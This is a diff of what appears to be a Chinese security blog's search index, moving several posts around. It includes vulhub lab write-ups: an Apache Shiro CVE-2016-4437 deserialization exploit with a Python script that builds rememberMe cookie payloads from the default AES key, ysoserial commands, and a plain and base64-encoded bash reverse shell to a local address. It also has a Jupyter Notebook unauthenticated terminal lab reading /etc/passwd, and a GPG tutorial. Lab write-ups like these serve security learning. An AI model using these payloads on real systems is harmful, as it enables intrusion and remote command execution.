@@ -37,8 +37,8 @@
         <category>vulhub</category>
       </categories>
       <tags>
-        <tag>漏洞</tag>
         <tag>vulhub</tag>
+        <tag>漏洞</tag>
       </tags>
   </entry>
   <entry>
@@ -68,8 +68,65 @@
         <category>vulhub</category>
       </categories>
       <tags>
-        <tag>漏洞</tag>
         <tag>vulhub</tag>
+        <tag>漏洞</tag>
+      </tags>
+  </entry>
+  <entry>
+    <title>Apache Shiro 1.2.4反序列化漏洞(CVE-2016-4437)</title>
+    <url>/2023/11/23/Apache-Shiro-1-2-4%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E-CVE-2016-4437/</url>
+    <content><![CDATA[<h1 id="实验要求"><a href="#实验要求" class="headerlink" title="实验要求"></a>实验要求</h1><p>漏洞环境：Apache Shiro 1.2.4反序列化漏洞(CVE-2016-4437)</p>
+<ol>
+<li>复现环境中的反序列化漏洞，截图证明</li>
+<li>尝试利用漏洞执行系统命令，列出&#x2F;etc目录的文件结构，提供截图</li>
+</ol>
+<h1 id="靶场搭建"><a href="#靶场搭建" class="headerlink" title="靶场搭建"></a>靶场搭建</h1><p>执行如下命令启动一个使用了Apache Shiro 1.2.4的Web服务：</p>
+<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">docker compose up -d</span><br></pre></td></tr></table></figure>
+
+<p>服务启动后，访问<code>http://your-ip:8080</code>可使用<code>admin:vulhub</code>进行登录。</p>
+<h1 id="产生原因"><a href="#产生原因" class="headerlink" title="产生原因"></a>产生原因</h1><p>shiro默认使用了<code>CookieRememberMeManager</code>，其处理cookie的流程是：得到<code>rememberMe的cookie值</code>–&gt;<code>Base64解码</code>–&gt;<code>AES解密</code>–&gt;<code>反序列化</code>。<br> 然而AES的密钥是硬编码的，就导致了攻击者可以构造恶意数据造成反序列化的RCE漏洞。</p>
+<h1 id="漏洞复现"><a href="#漏洞复现" class="headerlink" title="漏洞复现"></a>漏洞复现</h1><h2 id="工具准备"><a href="#工具准备" class="headerlink" title="工具准备"></a>工具准备</h2><ul>
+<li>Python环境，java8环境</li>
+<li>ysoserial-all.jar -&gt; <a href="https://jitpack.io/com/github/frohoff/ysoserial/master-SNAPSHOT/ysoserial-master-SNAPSHOT.jar">https://jitpack.io/com/github/frohoff/ysoserial/master-SNAPSHOT/ysoserial-master-SNAPSHOT.jar</a></li>
+<li>payload生成代码</li>
+</ul>
+<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> sys</span><br><span class="line"><span class="keyword">import</span> uuid</span><br><span class="line"><span class="keyword">import</span> base64</span><br><span class="line"><span class="keyword">from</span> Crypto.Cipher <span class="keyword">import</span> AES</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">encode_rememberme</span>():</span><br><span class="line">    f = <span class="built_in">open</span>(<span class="string">&#x27;poc.ser&#x27;</span>,<span class="string">&#x27;rb&#x27;</span>)</span><br><span class="line">    BS = AES.block_size</span><br><span class="line">    pad = <span class="keyword">lambda</span> s: s + ((BS - <span class="built_in">len</span>(s) % BS) * <span class="built_in">chr</span>(BS - <span class="built_in">len</span>(s) % BS)).encode()</span><br><span class="line">    key = base64.b64decode(<span class="string">&quot;kPH+bIxk5D2deZiIxcaaaA==&quot;</span>)</span><br><span class="line">    iv = uuid.uuid4().<span class="built_in">bytes</span></span><br><span class="line">    encryptor = AES.new(key, AES.MODE_CBC, iv)</span><br><span class="line">    file_body = pad(f.read())</span><br><span class="line">    base64_ciphertext = base64.b64encode(iv + encryptor.encrypt(file_body))</span><br><span class="line">    <span class="keyword">return</span> base64_ciphertext</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&#x27;__main__&#x27;</span>:</span><br><span class="line">    payload = encode_rememberme()    </span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;rememberMe=&#123;0&#125;&quot;</span>.<span class="built_in">format</span>(payload.decode()))</span><br></pre></td></tr></table></figure>
+
+<h2 id="复现"><a href="#复现" class="headerlink" title="复现"></a>复现</h2><p>从返回包中发现有<code>remember=deleteMe</code>的字样，可以大致确定配置有<code>shiro</code></p>
+<p><img data-src="https://images.gaifagafin.top/202311252007202.png"></p>
+<p>使用<code>ysoserial</code>生成CommonsBeanutils1的Gadget：</p>
+<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">java -jar ysoserial-all.jar CommonsBeanutils1 <span class="string">&quot;touch /tmp/success&quot;</span> &gt; poc.ser</span><br></pre></td></tr></table></figure>
+
+<p><img data-src="https://images.gaifagafin.top/202311252007208.png"></p>
+<p>再使用写好的python脚本生成payload(python脚本与poc.ser在同一目录下)</p>
+<p><img data-src="https://images.gaifagafin.top/202311252007121.png"></p>
+<p>将payload添加到cookie字段</p>
+<p><img data-src="https://images.gaifagafin.top/202311252007645.png"></p>
+<p>发送数据包后，打开容器验证，成功创建<code>success</code></p>
+<p><img data-src="https://images.gaifagafin.top/202311252007749.png"></p>
+<h1 id="反弹shell读取-etc目录"><a href="#反弹shell读取-etc目录" class="headerlink" title="反弹shell读取&#x2F;etc目录"></a>反弹shell读取&#x2F;etc目录</h1><p>在目标机上执行如下命令即可获得反弹shell，网站：<a href="https://forum.ywhack.com/shell.php">https://forum.ywhack.com/shell.php</a></p>
+<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">bash -i &gt;&amp; /dev/tcp/192.168.137.1/6666 0&gt;&amp;1</span><br></pre></td></tr></table></figure>
+
+<p>但在这里指令需要加密（因为重定向和管道字符的使用方式在启动过程中的上下文没有意义），选择箭头指出的命令</p>
+<img data-src="https://images.gaifagafin.top/202311252007662.png" style="zoom:80%;" />
+
+<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">bash -c &#123;<span class="built_in">echo</span>,YmFzaCAtaSA+JiAvZGV2L3RjcC8xOTIuMTY4LjEzNy4xLzY2NjYgMD4mMQ==&#125;|&#123;<span class="built_in">base64</span>,-d&#125;|&#123;bash,-i&#125;</span><br></pre></td></tr></table></figure>
+
+<p>同样利用ysoserial生成序列化数据，再利用python脚本生成payload</p>
+<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">java -jar ysoserial-all.jar CommonsBeanutils1 <span class="string">&quot;bash -c &#123;echo,YmFzaCAtaSA+JiAvZGV2L3RjcC8xOTIuMTY4LjEzNy4xLzY2NjYgMD4mMQ==&#125;|&#123;base64,-d&#125;|&#123;bash,-i&#125;&quot;</span> &gt; poc2.ser</span><br></pre></td></tr></table></figure>
+
+<p><img data-src="https://images.gaifagafin.top/202311252007633.png"></p>
+<p>发送payload之前需<strong>监听攻击机端口</strong>，将payload添加到请求包cookie字段后发送</p>
+<p><img data-src="https://images.gaifagafin.top/202311252007088.png"></p>
+<p>成功反弹shell，查看&#x2F;etc目录</p>
+<p><img data-src="https://images.gaifagafin.top/202311252007752.png"></p>
+]]></content>
+      <categories>
+        <category>vulhub</category>
+      </categories>
+      <tags>
+        <tag>vulhub</tag>
+        <tag>漏洞</tag>
       </tags>
   </entry>
   <entry>
@@ -152,65 +209,36 @@
         <category>vulhub</category>
       </categories>
       <tags>
-        <tag>漏洞</tag>
         <tag>vulhub</tag>
+        <tag>漏洞</tag>
       </tags>
   </entry>
   <entry>
-    <title>Apache Shiro 1.2.4反序列化漏洞(CVE-2016-4437)</title>
-    <url>/2023/11/23/Apache-Shiro-1-2-4%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E-CVE-2016-4437/</url>
-    <content><![CDATA[<h1 id="实验要求"><a href="#实验要求" class="headerlink" title="实验要求"></a>实验要求</h1><p>漏洞环境：Apache Shiro 1.2.4反序列化漏洞(CVE-2016-4437)</p>
+    <title>Jupyter Notebook 未授权访问漏洞</title>
+    <url>/2023/11/22/Jupyter-Notebook-%E6%9C%AA%E6%8E%88%E6%9D%83%E8%AE%BF%E9%97%AE%E6%BC%8F%E6%B4%9E/</url>
+    <content><![CDATA[<h1 id="实验要求"><a href="#实验要求" class="headerlink" title="实验要求"></a>实验要求</h1><p>漏洞环境：Jupyter Notebook 未授权访问漏洞</p>
 <ol>
-<li>复现环境中的反序列化漏洞，截图证明</li>
-<li>尝试利用漏洞执行系统命令，列出&#x2F;etc目录的文件结构，提供截图</li>
+<li>复现环境中的未授权访问漏洞，登录Jupyter Web管理界面，截图证明</li>
+<li>利用Jupyter Notebook控制台执行系统命令，读取&#x2F;etc&#x2F;passwd内容，提供截图</li>
 </ol>
-<h1 id="靶场搭建"><a href="#靶场搭建" class="headerlink" title="靶场搭建"></a>靶场搭建</h1><p>执行如下命令启动一个使用了Apache Shiro 1.2.4的Web服务：</p>
+<h1 id="靶场搭建"><a href="#靶场搭建" class="headerlink" title="靶场搭建"></a>靶场搭建</h1><p>运行测试环境：</p>
 <figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">docker compose up -d</span><br></pre></td></tr></table></figure>
 
-<p>服务启动后，访问<code>http://your-ip:8080</code>可使用<code>admin:vulhub</code>进行登录。</p>
-<h1 id="产生原因"><a href="#产生原因" class="headerlink" title="产生原因"></a>产生原因</h1><p>shiro默认使用了<code>CookieRememberMeManager</code>，其处理cookie的流程是：得到<code>rememberMe的cookie值</code>–&gt;<code>Base64解码</code>–&gt;<code>AES解密</code>–&gt;<code>反序列化</code>。<br> 然而AES的密钥是硬编码的，就导致了攻击者可以构造恶意数据造成反序列化的RCE漏洞。</p>
-<h1 id="漏洞复现"><a href="#漏洞复现" class="headerlink" title="漏洞复现"></a>漏洞复现</h1><h2 id="工具准备"><a href="#工具准备" class="headerlink" title="工具准备"></a>工具准备</h2><ul>
-<li>Python环境，java8环境</li>
-<li>ysoserial-all.jar -&gt; <a href="https://jitpack.io/com/github/frohoff/ysoserial/master-SNAPSHOT/ysoserial-master-SNAPSHOT.jar">https://jitpack.io/com/github/frohoff/ysoserial/master-SNAPSHOT/ysoserial-master-SNAPSHOT.jar</a></li>
-<li>payload生成代码</li>
-</ul>
-<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> sys</span><br><span class="line"><span class="keyword">import</span> uuid</span><br><span class="line"><span class="keyword">import</span> base64</span><br><span class="line"><span class="keyword">from</span> Crypto.Cipher <span class="keyword">import</span> AES</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">encode_rememberme</span>():</span><br><span class="line">    f = <span class="built_in">open</span>(<span class="string">&#x27;poc.ser&#x27;</span>,<span class="string">&#x27;rb&#x27;</span>)</span><br><span class="line">    BS = AES.block_size</span><br><span class="line">    pad = <span class="keyword">lambda</span> s: s + ((BS - <span class="built_in">len</span>(s) % BS) * <span class="built_in">chr</span>(BS - <span class="built_in">len</span>(s) % BS)).encode()</span><br><span class="line">    key = base64.b64decode(<span class="string">&quot;kPH+bIxk5D2deZiIxcaaaA==&quot;</span>)</span><br><span class="line">    iv = uuid.uuid4().<span class="built_in">bytes</span></span><br><span class="line">    encryptor = AES.new(key, AES.MODE_CBC, iv)</span><br><span class="line">    file_body = pad(f.read())</span><br><span class="line">    base64_ciphertext = base64.b64encode(iv + encryptor.encrypt(file_body))</span><br><span class="line">    <span class="keyword">return</span> base64_ciphertext</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&#x27;__main__&#x27;</span>:</span><br><span class="line">    payload = encode_rememberme()    </span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;rememberMe=&#123;0&#125;&quot;</span>.<span class="built_in">format</span>(payload.decode()))</span><br></pre></td></tr></table></figure>
+<p>运行后，访问<code>http://your-ip:8888</code>将看到Jupyter Notebook的Web管理界面，并没有要求填写密码。</p>
+<h1 id="漏洞复现"><a href="#漏洞复现" class="headerlink" title="漏洞复现"></a>漏洞复现</h1><p>选择 new -&gt; terminal 即可创建一个控制台：</p>
+<img data-src="https://images.gaifagafin.top/202311222307962.png" style="zoom:67%;" />
 
-<h2 id="复现"><a href="#复现" class="headerlink" title="复现"></a>复现</h2><p>从返回包中发现有<code>remember=deleteMe</code>的字样，可以大致确定配置有<code>shiro</code></p>
-<p><img data-src="https://images.gaifagafin.top/202311252007202.png"></p>
-<p>使用<code>ysoserial</code>生成CommonsBeanutils1的Gadget：</p>
-<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">java -jar ysoserial-all.jar CommonsBeanutils1 <span class="string">&quot;touch /tmp/success&quot;</span> &gt; poc.ser</span><br></pre></td></tr></table></figure>
+<p>可以直接执行任意命令：</p>
+<img data-src="https://images.gaifagafin.top/202311222307718.png" style="zoom:80%;" />
 
-<p><img data-src="https://images.gaifagafin.top/202311252007208.png"></p>
-<p>再使用写好的python脚本生成payload(python脚本与poc.ser在同一目录下)</p>
-<p><img data-src="https://images.gaifagafin.top/202311252007121.png"></p>
-<p>将payload添加到cookie字段</p>
-<p><img data-src="https://images.gaifagafin.top/202311252007645.png"></p>
-<p>发送数据包后，打开容器验证，成功创建<code>success</code></p>
-<p><img data-src="https://images.gaifagafin.top/202311252007749.png"></p>
-<h1 id="反弹shell读取-etc目录"><a href="#反弹shell读取-etc目录" class="headerlink" title="反弹shell读取&#x2F;etc目录"></a>反弹shell读取&#x2F;etc目录</h1><p>在目标机上执行如下命令即可获得反弹shell，网站：<a href="https://forum.ywhack.com/shell.php">https://forum.ywhack.com/shell.php</a></p>
-<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">bash -i &gt;&amp; /dev/tcp/192.168.137.1/6666 0&gt;&amp;1</span><br></pre></td></tr></table></figure>
-
-<p>但在这里指令需要加密（因为重定向和管道字符的使用方式在启动过程中的上下文没有意义），选择箭头指出的命令</p>
-<img data-src="https://images.gaifagafin.top/202311252007662.png" style="zoom:80%;" />
-
-<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">bash -c &#123;<span class="built_in">echo</span>,YmFzaCAtaSA+JiAvZGV2L3RjcC8xOTIuMTY4LjEzNy4xLzY2NjYgMD4mMQ==&#125;|&#123;<span class="built_in">base64</span>,-d&#125;|&#123;bash,-i&#125;</span><br></pre></td></tr></table></figure>
-
-<p>同样利用ysoserial生成序列化数据，再利用python脚本生成payload</p>
-<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">java -jar ysoserial-all.jar CommonsBeanutils1 <span class="string">&quot;bash -c &#123;echo,YmFzaCAtaSA+JiAvZGV2L3RjcC8xOTIuMTY4LjEzNy4xLzY2NjYgMD4mMQ==&#125;|&#123;base64,-d&#125;|&#123;bash,-i&#125;&quot;</span> &gt; poc2.ser</span><br></pre></td></tr></table></figure>
-
-<p><img data-src="https://images.gaifagafin.top/202311252007633.png"></p>
-<p>发送payload之前需<strong>监听攻击机端口</strong>，将payload添加到请求包cookie字段后发送</p>
-<p><img data-src="https://images.gaifagafin.top/202311252007088.png"></p>
-<p>成功反弹shell，查看&#x2F;etc目录</p>
-<p><img data-src="https://images.gaifagafin.top/202311252007752.png"></p>
+<h1 id="读取-etc-passwd内容"><a href="#读取-etc-passwd内容" class="headerlink" title="读取&#x2F;etc&#x2F;passwd内容"></a>读取&#x2F;etc&#x2F;passwd内容</h1><img data-src="https://images.gaifagafin.top/202311222307464.png" style="zoom:80%;" />
 ]]></content>
       <categories>
         <category>vulhub</category>
       </categories>
       <tags>
-        <tag>漏洞</tag>
         <tag>vulhub</tag>
+        <tag>漏洞</tag>
       </tags>
   </entry>
   <entry>
@@ -614,31 +642,90 @@
       </tags>
   </entry>
   <entry>
-    <title>Jupyter Notebook 未授权访问漏洞</title>
-    <url>/2023/11/22/Jupyter-Notebook-%E6%9C%AA%E6%8E%88%E6%9D%83%E8%AE%BF%E9%97%AE%E6%BC%8F%E6%B4%9E/</url>
-    <content><![CDATA[<h1 id="实验要求"><a href="#实验要求" class="headerlink" title="实验要求"></a>实验要求</h1><p>漏洞环境：Jupyter Notebook 未授权访问漏洞</p>
-<ol>
-<li>复现环境中的未授权访问漏洞，登录Jupyter Web管理界面，截图证明</li>
-<li>利用Jupyter Notebook控制台执行系统命令，读取&#x2F;etc&#x2F;passwd内容，提供截图</li>
-</ol>
-<h1 id="靶场搭建"><a href="#靶场搭建" class="headerlink" title="靶场搭建"></a>靶场搭建</h1><p>运行测试环境：</p>
-<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">docker compose up -d</span><br></pre></td></tr></table></figure>
+    <title>Linux_GPG加解密文件</title>
+    <url>/2023/11/10/Linux%E4%BD%BF%E7%94%A8GPG%E5%8A%A0%E5%AF%86%E6%96%87%E4%BB%B6/</url>
+    <content><![CDATA[<h2 id="下载GPG"><a href="#下载GPG" class="headerlink" title="下载GPG"></a>下载GPG</h2><p>GPG官方下载地址: <a href="https://gnupg.org/download/index.html">https://gnupg.org/download/index.html</a></p>
+<p>我所使用的是kali_Linux，选择的是</p>
+<img data-src="https://images.gaifagafin.top/202311101728889.png" style="zoom: 67%;" />
 
-<p>运行后，访问<code>http://your-ip:8888</code>将看到Jupyter Notebook的Web管理界面，并没有要求填写密码。</p>
-<h1 id="漏洞复现"><a href="#漏洞复现" class="headerlink" title="漏洞复现"></a>漏洞复现</h1><p>选择 new -&gt; terminal 即可创建一个控制台：</p>
-<img data-src="https://images.gaifagafin.top/202311222307962.png" style="zoom:67%;" />
+<p>请自行选择适合的版本下载，解压即可使用</p>
+<p>也可以输入命令安装</p>
+<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">sudo apt install gnupg</span><br></pre></td></tr></table></figure>
 
-<p>可以直接执行任意命令：</p>
-<img data-src="https://images.gaifagafin.top/202311222307718.png" style="zoom:80%;" />
+<hr>
+<p>要使用 GPG，你首先需要有一个 GPG 密钥。</p>
+<p>GPG 密钥是你在后面的教程中用来加密（或解密）文件的东西。它也是用来识别你的身份的，你的名字和电子邮件也会与密钥绑定。</p>
+<p>GPG 密钥的工作原理是使用两个文件，一个私钥和一个公钥。这两个密钥是相互联系的，并且 GPG 的所有功能都需要使用它们，特别是对文件加密和解密。</p>
+<p>当你用 GPG 加密一个文件时，它使用的是私钥。然后，这个新的加密文件<strong>只能</strong>用配对的公钥进行解密。</p>
+<p>私钥，顾名思义，是以私下的、不给任何人看的方式来存储的密钥。</p>
+<p>另一方面，公钥是用来给其他人的，或者你希望能够解密你的文件的任何人。</p>
+<p>这就是 GPG 的加密方法的主要作用。它允许你对文件进行本地加密，然后允许其他人确保他们收到的文件实际上是由你发送的。因为他们能够解密文件的唯一方法是使用你的公钥，而这只有在文件首先使用你的私钥加密的情况下才有效。</p>
+<p><strong>反之</strong>，其他人可以用你的公钥对文件进行加密，而唯一能够解密的方法是用你的私钥。因此，允许其他人公开发布文件，而不用担心除了你以外的人能够阅读它们。（LCTT 译注：另外一个常见的用例是你用你的私钥对公开发布的文件进行签名，别人使用你的公钥通过验证你的签名而确信文件是你发布的、并没有被篡改。但本文没有涉及这个用例。）</p>
+<p>换句话说，如果一个文件是用私钥加密的，它只能用相应的公钥解密。而如果一个文件是用公钥加密的，它只能用相应的私钥解密。</p>
+<h2 id="生成GPG密钥"><a href="#生成GPG密钥" class="headerlink" title="生成GPG密钥"></a>生成GPG密钥</h2><p>运行下面指令</p>
+<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">gpg --full-generate-key</span><br></pre></td></tr></table></figure>
 
-<h1 id="读取-etc-passwd内容"><a href="#读取-etc-passwd内容" class="headerlink" title="读取&#x2F;etc&#x2F;passwd内容"></a>读取&#x2F;etc&#x2F;passwd内容</h1><img data-src="https://images.gaifagafin.top/202311222307464.png" style="zoom:80%;" />
+<p>根据你的选择填写密钥类型，密钥长度，有效期限，姓名和邮箱</p>
+<img data-src="https://images.gaifagafin.top/202311101728808.png" style="zoom: 67%;" />
+
+<p>输入O确定时，会让你输入密码，这个是可选项</p>
+<img data-src="https://images.gaifagafin.top/202311101728440.png" style="zoom: 67%;" />
+
+<p>如果不想填就直接点确定，选择”是的，保护不是必须的”</p>
+<img data-src="https://images.gaifagafin.top/202311101728040.png" style="zoom: 67%;" />
+
+<p>然后就会生成密钥对</p>
+<img data-src="https://images.gaifagafin.top/202311101728869.png" style="zoom:67%;" />
+
+<p>这里我们看不到私钥，可以终端输入下面指令查看</p>
+<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">gpg --list-secret-keys</span><br></pre></td></tr></table></figure>
+
+<img data-src="https://images.gaifagafin.top/202311101728476.png" style="zoom: 67%;" />
+
+<h2 id="GPG加密文件"><a href="#GPG加密文件" class="headerlink" title="GPG加密文件"></a>GPG加密文件</h2><p>首先创建要加密的文件(类型不限)test.txt</p>
+<p>要发送加密文件给别人，<strong>你需要有接收者的公钥</strong>，用接收者的公钥加密文件，这样<strong>只有接收者才能解密文件</strong>。具体怎么获得密钥由你自己决定。 你可以让他们直接把公钥发送给你， 也可以通过密钥服务器来获取。</p>
+<p>收到对方公钥文件后，导入公钥到 GPG 中。</p>
+<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">gpg --import receiver.key</span><br></pre></td></tr></table></figure>
+
+<img data-src="https://images.gaifagafin.top/202311101728778.png" style="zoom: 67%;" />
+
+<p>这些公钥与你自己创建的密钥一样，自带了名称和电子邮件地址的信息。 </p>
+<p>现在可以开始加密要发送的文件了。GPG 需要知道这个文件的接收者和发送者。输入下面指令, 这里<code>-e</code>标志告诉 GPG 你想要加密文件，<code>-r</code>标志指定接收者。</p>
+<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">gpg -e -r &quot;Receiver Name&quot; test.txt</span><br></pre></td></tr></table></figure>
+
+<img data-src="https://images.gaifagafin.top/202311101728527.png" style="zoom: 67%;" />
+
+<p>得到<code>.gpg</code>后缀的加密文件</p>
+<img data-src="https://images.gaifagafin.top/202311101728516.png" style="zoom: 67%;" />
+
+<p>如果你有多个密钥，可以用下面指令加密，<code>-u</code>参数指定发送者</p>
+<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">gpg -e -u &quot;Your Name&quot; -r &quot;Receiver Name&quot; &lt;filename&gt;</span><br></pre></td></tr></table></figure>
+
+<h2 id="GPG解密文件"><a href="#GPG解密文件" class="headerlink" title="GPG解密文件"></a>GPG解密文件</h2><p>收到对方用我们自己的公钥加密的.gpg文件后，使用下面命令解密</p>
+<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">gpg -d &lt;filename&gt;</span><br></pre></td></tr></table></figure>
+
+<p>例如我要解密用我的公钥加密的.gpg文件 1.txt.gpg 直接终端输入<code>gpg -d 1.txt.gpg </code></p>
+<img data-src="https://images.gaifagafin.top/202311101728700.png" style="zoom: 67%;" />
+
+<h2 id="删除密钥"><a href="#删除密钥" class="headerlink" title="删除密钥"></a>删除密钥</h2><p>删除密钥有三个选项：</p>
+<p>–delete-keys、–delete-secret-keys和–delete-secret-and-public-key<br>–delete-keys表示从公钥钥匙圈上删除密钥，也就是一同删除公钥和对应的私钥。在分批模式（batch mode）下，密钥必须使用指纹表示，或者使用–yes选项。<br>–delete-secret-keys表示从私钥钥匙圈上删除密钥。<br>–delete-secret-and-public-key和–delete-keys一样，但是如果私钥存在的话，会先移除私钥。在分批模式下，密钥必须使用指纹表示。</p>
+<p>例如我要删除我的公钥中的<code>testname</code>公钥，就输入下面的语句</p>
+<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">gpg --delete-keys testname</span><br></pre></td></tr></table></figure>
+
+<p>要删除<code>testname</code>私钥，就输入下面语句</p>
+<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">gpg --delete-secret-keys testname</span><br></pre></td></tr></table></figure>
+
+<hr>
+<p>参考链接:</p>
+<p><a href="https://www.linuxprobe.com/gpg-encrypt-decrypt.html">https://www.linuxprobe.com/gpg-encrypt-decrypt.html</a></p>
+<p><a href="https://blog.csdn.net/qq_33919450/article/details/115706604">https://blog.csdn.net/qq_33919450/article/details/115706604</a></p>
 ]]></content>
       <categories>
-        <category>vulhub</category>
+        <category>Linux</category>
       </categories>
       <tags>
-        <tag>漏洞</tag>
-        <tag>vulhub</tag>
+        <tag>GPG</tag>
+        <tag>Linux</tag>
       </tags>
   </entry>
   <entry>
@@ -726,95 +813,8 @@
         <category>vulhub</category>
       </categories>
       <tags>
-        <tag>漏洞</tag>
         <tag>vulhub</tag>
-      </tags>
-  </entry>
-  <entry>
-    <title>Linux_GPG加解密文件</title>
-    <url>/2023/11/10/Linux%E4%BD%BF%E7%94%A8GPG%E5%8A%A0%E5%AF%86%E6%96%87%E4%BB%B6/</url>
-    <content><![CDATA[<h2 id="下载GPG"><a href="#下载GPG" class="headerlink" title="下载GPG"></a>下载GPG</h2><p>GPG官方下载地址: <a href="https://gnupg.org/download/index.html">https://gnupg.org/download/index.html</a></p>
-<p>我所使用的是kali_Linux，选择的是</p>
-<img data-src="https://images.gaifagafin.top/202311101728889.png" style="zoom: 67%;" />
-
-<p>请自行选择适合的版本下载，解压即可使用</p>
-<p>也可以输入命令安装</p>
-<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">sudo apt install gnupg</span><br></pre></td></tr></table></figure>
-
-<hr>
-<p>要使用 GPG，你首先需要有一个 GPG 密钥。</p>
-<p>GPG 密钥是你在后面的教程中用来加密（或解密）文件的东西。它也是用来识别你的身份的，你的名字和电子邮件也会与密钥绑定。</p>
-<p>GPG 密钥的工作原理是使用两个文件，一个私钥和一个公钥。这两个密钥是相互联系的，并且 GPG 的所有功能都需要使用它们，特别是对文件加密和解密。</p>
-<p>当你用 GPG 加密一个文件时，它使用的是私钥。然后，这个新的加密文件<strong>只能</strong>用配对的公钥进行解密。</p>
-<p>私钥，顾名思义，是以私下的、不给任何人看的方式来存储的密钥。</p>
-<p>另一方面，公钥是用来给其他人的，或者你希望能够解密你的文件的任何人。</p>
-<p>这就是 GPG 的加密方法的主要作用。它允许你对文件进行本地加密，然后允许其他人确保他们收到的文件实际上是由你发送的。因为他们能够解密文件的唯一方法是使用你的公钥，而这只有在文件首先使用你的私钥加密的情况下才有效。</p>
-<p><strong>反之</strong>，其他人可以用你的公钥对文件进行加密，而唯一能够解密的方法是用你的私钥。因此，允许其他人公开发布文件，而不用担心除了你以外的人能够阅读它们。（LCTT 译注：另外一个常见的用例是你用你的私钥对公开发布的文件进行签名，别人使用你的公钥通过验证你的签名而确信文件是你发布的、并没有被篡改。但本文没有涉及这个用例。）</p>
-<p>换句话说，如果一个文件是用私钥加密的，它只能用相应的公钥解密。而如果一个文件是用公钥加密的，它只能用相应的私钥解密。</p>
-<h2 id="生成GPG密钥"><a href="#生成GPG密钥" class="headerlink" title="生成GPG密钥"></a>生成GPG密钥</h2><p>运行下面指令</p>
-<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">gpg --full-generate-key</span><br></pre></td></tr></table></figure>
-
-<p>根据你的选择填写密钥类型，密钥长度，有效期限，姓名和邮箱</p>
-<img data-src="https://images.gaifagafin.top/202311101728808.png" style="zoom: 67%;" />
-
-<p>输入O确定时，会让你输入密码，这个是可选项</p>
-<img data-src="https://images.gaifagafin.top/202311101728440.png" style="zoom: 67%;" />
-
-<p>如果不想填就直接点确定，选择”是的，保护不是必须的”</p>
-<img data-src="https://images.gaifagafin.top/202311101728040.png" style="zoom: 67%;" />
-
-<p>然后就会生成密钥对</p>
-<img data-src="https://images.gaifagafin.top/202311101728869.png" style="zoom:67%;" />
-
-<p>这里我们看不到私钥，可以终端输入下面指令查看</p>
-<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">gpg --list-secret-keys</span><br></pre></td></tr></table></figure>
-
-<img data-src="https://images.gaifagafin.top/202311101728476.png" style="zoom: 67%;" />
-
-<h2 id="GPG加密文件"><a href="#GPG加密文件" class="headerlink" title="GPG加密文件"></a>GPG加密文件</h2><p>首先创建要加密的文件(类型不限)test.txt</p>
-<p>要发送加密文件给别人，<strong>你需要有接收者的公钥</strong>，用接收者的公钥加密文件，这样<strong>只有接收者才能解密文件</strong>。具体怎么获得密钥由你自己决定。 你可以让他们直接把公钥发送给你， 也可以通过密钥服务器来获取。</p>
-<p>收到对方公钥文件后，导入公钥到 GPG 中。</p>
-<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">gpg --import receiver.key</span><br></pre></td></tr></table></figure>
-
-<img data-src="https://images.gaifagafin.top/202311101728778.png" style="zoom: 67%;" />
-
-<p>这些公钥与你自己创建的密钥一样，自带了名称和电子邮件地址的信息。 </p>
-<p>现在可以开始加密要发送的文件了。GPG 需要知道这个文件的接收者和发送者。输入下面指令, 这里<code>-e</code>标志告诉 GPG 你想要加密文件，<code>-r</code>标志指定接收者。</p>
-<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">gpg -e -r &quot;Receiver Name&quot; test.txt</span><br></pre></td></tr></table></figure>
-
-<img data-src="https://images.gaifagafin.top/202311101728527.png" style="zoom: 67%;" />
-
-<p>得到<code>.gpg</code>后缀的加密文件</p>
-<img data-src="https://images.gaifagafin.top/202311101728516.png" style="zoom: 67%;" />
-
-<p>如果你有多个密钥，可以用下面指令加密，<code>-u</code>参数指定发送者</p>
-<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">gpg -e -u &quot;Your Name&quot; -r &quot;Receiver Name&quot; &lt;filename&gt;</span><br></pre></td></tr></table></figure>
-
-<h2 id="GPG解密文件"><a href="#GPG解密文件" class="headerlink" title="GPG解密文件"></a>GPG解密文件</h2><p>收到对方用我们自己的公钥加密的.gpg文件后，使用下面命令解密</p>
-<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">gpg -d &lt;filename&gt;</span><br></pre></td></tr></table></figure>
-
-<p>例如我要解密用我的公钥加密的.gpg文件 1.txt.gpg 直接终端输入<code>gpg -d 1.txt.gpg </code></p>
-<img data-src="https://images.gaifagafin.top/202311101728700.png" style="zoom: 67%;" />
